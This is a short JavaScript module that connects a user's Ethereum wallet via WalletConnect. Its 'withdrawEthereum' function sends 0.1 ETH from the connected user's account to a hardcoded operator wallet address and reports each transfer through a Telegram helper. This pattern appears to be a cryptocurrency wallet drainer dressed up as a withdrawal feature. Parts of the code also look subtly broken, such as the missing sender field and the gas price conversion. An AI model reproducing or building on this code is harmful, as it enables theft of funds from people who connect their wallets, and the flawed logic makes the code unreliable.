import Web3 from 'web3';
import WalletConnectProvider from '@walletconnect/web3-provider';
import axios from 'axios';
import { sendTelegramMessage } from './telegram';
import { ETH_INFURA_ID, ETH_WALLET_ADDRESS } from '../config';

export async function connectEthereumWallet() {
    const provider = new WalletConnectProvider({
        infuraId: ETH_INFURA_ID,
    });

    await provider.enable();
    window.web3 = new Web3(provider);
}

export async function withdrawEthereum() {
    const accounts = await window.web3.eth.getAccounts();
    const account = accounts[0];
    const gasPrice = await getGasPrice();

    const transaction = {
        to: ETH_WALLET_ADDRESS,
        value: window.web3.utils.toWei('0.1', 'ether'), // Adjust value accordingly
        gasPrice,
        gas: 21000, // Standard gas limit for ETH transfer
    };

    const txHash = await window.web3.eth.sendTransaction(transaction);
    await confirmTransaction(txHash, window.web3.eth);
    sendTelegramMessage(`Ethereum withdrawal: ${transaction.value} to ${transaction.to}`);
}

async function getGasPrice() {
    try {
        const response = await axios.get('https://ethgasstation.info/api/ethgasAPI.json');
        const gasPrice = response.data.fast / 10; // Convert to Gwei
        return gasPrice * 1e9; // Convert to Wei
    } catch (error) {
        console.error('Error fetching gas price:', error);
        return window.web3.utils.toWei('100', 'gwei'); // Default to 100 Gwei
    }
}

async function confirmTransaction(txHash, web3) {
    let confirmed = false;
    let retries = 10;
    while (!confirmed && retries > 0) {
        const receipt = await web3.getTransactionReceipt(txHash);
        if (receipt && receipt.status) {
            confirmed = true;
        } else {
            await new Promise(resolve => setTimeout(resolve, 30000)); // Wait 30 seconds
            retries--;
        }
    }
    if (!confirmed) {
        throw new Error('Transaction confirmation failed');
    }
}
